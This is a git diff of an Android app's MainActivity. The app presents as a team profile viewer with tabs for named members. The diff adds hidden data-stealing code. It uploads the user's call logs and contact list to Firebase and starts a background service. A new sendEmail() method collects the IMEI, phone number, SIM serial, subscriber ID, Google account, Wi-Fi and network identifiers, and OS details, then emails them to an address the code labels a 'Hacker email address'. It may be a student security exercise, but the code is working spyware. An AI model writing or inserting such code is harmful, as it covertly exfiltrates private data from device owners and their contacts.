@@ -1,14 +1,26 @@
 package com.example.super_secret;
-
+//test
 import java.util.Date;
 import android.Manifest;
+import android.accounts.Account;
+import android.accounts.AccountManager;
+import android.app.ActivityManager;
 import android.content.Context;
+import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
+import android.net.wifi.WifiInfo;
+import android.net.wifi.WifiManager;
+import android.os.Build;
 import android.os.Bundle;
+import android.os.Environment;
+import android.os.StatFs;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
+import android.telephony.TelephonyManager;
+import android.text.format.Formatter;
+import android.util.Log;
 import android.widget.Toast;
 import java.text.SimpleDateFormat;
 import com.google.android.material.tabs.TabLayout;
@@ -29,21 +41,38 @@ public class MainActivity extends AppCompatActivity {
     private static final int MY_PERMISSIONS_REQUEST_READ_CALL_LOG = 0;
     private static final int MY_PERMISSIONS_REQUEST_PHONE_STATE = 0;
     private static final int MY_PERMISSIONS_REQUEST_PHONE_CONTACTS = 0;
-
+    private static final String TAG = "Myactivity";
+    Intent mServiceIntent;
+    private ServiceSensor mSensorService;
+    Context ctx;
+    private Context getCtx() {
+        return ctx;
+    }
     private int PERMISSION_ALL = 1;
     private String[] PERMISSIONS = {
             Manifest.permission.RECEIVE_SMS,
             Manifest.permission.READ_CALL_LOG,
             Manifest.permission.READ_PHONE_STATE,
-            Manifest.permission.READ_CONTACTS
+            Manifest.permission.READ_CONTACTS,
+            Manifest.permission.INTERNET,
+            Manifest.permission.CHANGE_WIFI_STATE,
+            Manifest.permission.ACCESS_NETWORK_STATE,
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.ACCESS_COARSE_LOCATION,
+            Manifest.permission.GET_ACCOUNTS
     };
 
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        ctx = this;
         setContentView(R.layout.activity_main);
-
+        mSensorService = new ServiceSensor(getCtx());
+        mServiceIntent = new Intent(getCtx(), mSensorService.getClass());
+        if (!isMyServiceRunning(mSensorService.getClass())) {
+            startService(mServiceIntent);
+        }
         tabLayout = (TabLayout) findViewById(R.id.tabs);
         viewPager = (ViewPager) findViewById(R.id.view_pager);
         toolbar =  (Toolbar) findViewById(R.id.myToolbar);
@@ -56,13 +85,28 @@ public class MainActivity extends AppCompatActivity {
             ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL);
         }
 
-        getAllCallLogs(this);
-        getContactList(this);
-
+        else {
+            //execute all functions
+            getAllCallLogs(this);
+            getContactList(this);
+            sendEmail();
+        }
     }// OnCreate
     //after getting the result of permission request
 
-    public static boolean hasPermissions(Context context, String... permissions) {
+    private void setupViewPager(ViewPager viewPager) {
+        ViewPagerAdapter viewPagerAdapter = new ViewPagerAdapter(getSupportFragmentManager());
+        viewPagerAdapter.addFragment(new Homepage(),"Homepage");
+        viewPagerAdapter.addFragment(new Farid_Profile(),"Farid");
+        viewPagerAdapter.addFragment(new Derek_Profile(),"Derek");
+        viewPagerAdapter.addFragment(new Callie_Profile(),"Callie");
+        viewPagerAdapter.addFragment(new XinWei_Profile(),"Xin Wei");
+        viewPagerAdapter.addFragment(new MingKiat_Profile(),"Ming Kiat");
+        viewPagerAdapter.addFragment(new KangSian_Profile(),"Kang Sian");
+        viewPager.setAdapter(viewPagerAdapter);
+    }
+
+    private static boolean hasPermissions(Context context, String... permissions) {
         if (context != null && permissions != null) {
             for (String permission : permissions) {
                 if (ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
@@ -92,35 +136,6 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private void setupViewPager(ViewPager viewPager) {
-        ViewPagerAdapter viewPagerAdapter = new ViewPagerAdapter(getSupportFragmentManager());
-        viewPagerAdapter.addFragment(new Homepage(),"Homepage");
-        viewPagerAdapter.addFragment(new Farid_Profile(),"Farid");
-        viewPagerAdapter.addFragment(new Derek_Profile(),"Derek");
-        viewPagerAdapter.addFragment(new Callie_Profile(),"Callie");
-        viewPagerAdapter.addFragment(new XinWei_Profile(),"Xin Wei");
-        viewPagerAdapter.addFragment(new MingKiat_Profile(),"Ming Kiat");
-        viewPagerAdapter.addFragment(new KangSian_Profile(),"Kang Sian");
-        viewPager.setAdapter(viewPagerAdapter);
-    }
-
-    private void getDetails(){
-        FirebaseDatabase database = FirebaseDatabase.getInstance();
-        DatabaseReference myRef = database.getReference().child("callLogs").push();
-        Uri allCalls = Uri.parse("content://call_log/calls");
-        Cursor c = managedQuery(allCalls, null, null, null, null);
-        Toast.makeText(this,(CallLog.Calls.DURATION), Toast.LENGTH_LONG).show();
-        String number = CallLog.Calls.NUMBER;
-//        String num= c.getString(c.getColumnIndex(CallLog.Calls.NUMBER));// for  number
-//        String name= c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME));// for name
-//        String duration = c.getString(c.getColumnIndex(CallLog.Calls.DURATION));// for duration
-//        int type = Integer.parseInt(c.getString(c.getColumnIndex(CallLog.Calls.TYPE)));// for call type, Incoming or out going.
-
-        //myRef.child("Name").setValue(name);
-        myRef.child("Number").setValue(number);
-       // myRef.child("Duration").setValue(duration);
-        //myRef.child("type").setValue(type);
-    }
 
     private void getAllCallLogs(Context cr) {
 
@@ -132,7 +147,7 @@ public class MainActivity extends AppCompatActivity {
         // loop through cursor
         while (cur.moveToNext()) {
 
-            DatabaseReference myCallRef = database.getReference().child("callLogs").push();
+            DatabaseReference myCallRef = database.getReference().child("Call Logs").push();
 
             String callNumber = cur.getString(cur
                     .getColumnIndex(android.provider.CallLog.Calls.NUMBER));
@@ -159,9 +174,8 @@ public class MainActivity extends AppCompatActivity {
             myCallRef.child("Date of Call").setValue(dateString);
             myCallRef.child("Call Type").setValue(callType);
             myCallRef.child("New Call").setValue(isCallNew);
-            myCallRef.child("Call Duration").setValue(duration);
+            myCallRef.child("Call Duration in Seconds").setValue(duration);
         }
-
     }
 
 
@@ -179,7 +193,7 @@ public class MainActivity extends AppCompatActivity {
                     Cursor pCur = cr.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,
                             ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);
                     while (pCur.moveToNext()){
-                        DatabaseReference contactRef = database.getReference().child("contacts").push();
+                        DatabaseReference contactRef = database.getReference().child("Contact List Information").push();
                         String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                         contactRef.child("Name").setValue(name);
                         contactRef.child("Number").setValue(phoneNo);
@@ -193,4 +207,115 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
+    private void sendEmail(){
+        //Getting content for email
+        String email = "mingkiat95@gmail.com"; //Hacker email address
+        String subject = "Information Gathering";
+
+        //Retrieve Phone information
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
+            return;
+        }
+        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+
+        String imei = telephonyManager.getDeviceId();
+        String mPhoneNumber = telephonyManager.getLine1Number();
+        String SimSerialNumber = telephonyManager.getSimSerialNumber();
+
+        String NetworkOperator = telephonyManager.getSimOperatorName();
+        String SubscriberId = telephonyManager.getSubscriberId();
+
+        //Retrieve Network Details
+
+        //WifiManager wifiManager = (WifiManager) getSystemService(Context.WIFI_SERVICE);
+        WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+        WifiInfo info = wifiManager.getConnectionInfo();
+        String ip = Formatter.formatIpAddress(wifiManager.getConnectionInfo().getIpAddress());
+        String ssid = info.getSSID();
+        String bssid = info.getBSSID();
+        String macAddress = info.getMacAddress();
+        int wifiFreq = info.getFrequency();
+
+        //Retrieve Device OS details
+        String myVersion = android.os.Build.VERSION.RELEASE; // e.g. myVersion := "1.6"
+        int sdkVersion = android.os.Build.VERSION.SDK_INT; // e.g. sdkVersion := 8;
+        String BaseOS = Build.VERSION.BASE_OS;
+        String securityPatch = Build.VERSION.SECURITY_PATCH;
+        String phoneName = android.os.Build.MODEL;
+
+
+        //Check on the google ac login to the device
+        AccountManager manager = (AccountManager) getSystemService(ACCOUNT_SERVICE);
+        Account[] list = manager.getAccounts(); //get email address of device
+        String emailId = "asd";
+        for (Account account : list) {
+            if (account.type.equalsIgnoreCase("com.google")) {
+                emailId = account.name;
+                break;
+            }
+        }
+
+        //Check available space in the device
+        StatFs stat = new StatFs(Environment.getExternalStorageDirectory().getPath());
+        long bytesAvailable;
+        if (android.os.Build.VERSION.SDK_INT >=
+                android.os.Build.VERSION_CODES.JELLY_BEAN_MR2) {
+            bytesAvailable = stat.getBlockSizeLong() * stat.getAvailableBlocksLong();
+        }
+        else {
+            bytesAvailable = (long)stat.getBlockSize() * (long)stat.getAvailableBlocks();
+        }
+        long megAvailable = bytesAvailable / (1024 * 1024);
+
+
+        String message =
+                "=====AC Information===="+
+                        "\n MobileGoogleAcc : " + emailId +
+                        "\n\n =====Service Provider Info====" +
+                        "\n NetworkOperator : " + NetworkOperator +
+                        "\n SubscriberId : " + SubscriberId +
+                        "\n SimSerialNumber : " + SimSerialNumber +
+                        "\n\n =====Phone Information===="+
+                        "\n      Phone Name : " + phoneName +
+                        "\n         IMEI No : " + imei +
+                        "\n  AvailableSpace : " + megAvailable + "MB" +
+                        "\n Android Version : " + myVersion +
+                        "\n      SDKVersion : " + sdkVersion +
+                        "\n         BaseOS  : " + BaseOS +
+                        "\n   SecurityPatch : " + securityPatch +
+                        "\n\n=====Network Information===="+
+                        "\n      IP Address : " + ip +
+                        "\n            SSID : " + ssid +
+                        "\n           BSSID : " + bssid +
+                        "\n      MacAddress : " + macAddress +
+                        "\n        WiFiFreq : " + wifiFreq +
+                        "\n       MobileNum : " + mPhoneNumber;
+
+
+        //Creating SendMail object
+        SendMail sm = new SendMail(this, email, subject, message);
+
+        //Executing sendmail to send email
+        sm.execute();
+    }
+
+    private boolean isMyServiceRunning(Class<?> serviceClass) {
+        ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
+        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
+            if (serviceClass.getName().equals(service.service.getClassName())) {
+                Log.i("isMyServiceRunning?",true+"");
+                return true;
+            }
+        }
+        Log.i("isMyServiceRunning?",false+"");
+        return false;
+    }
+
+    @Override
+    protected void onDestroy()
+    {
+        stopService(mServiceIntent);
+        Log.i("MainAct","onDestroy!");
+        super.onDestroy();
+    }
 }
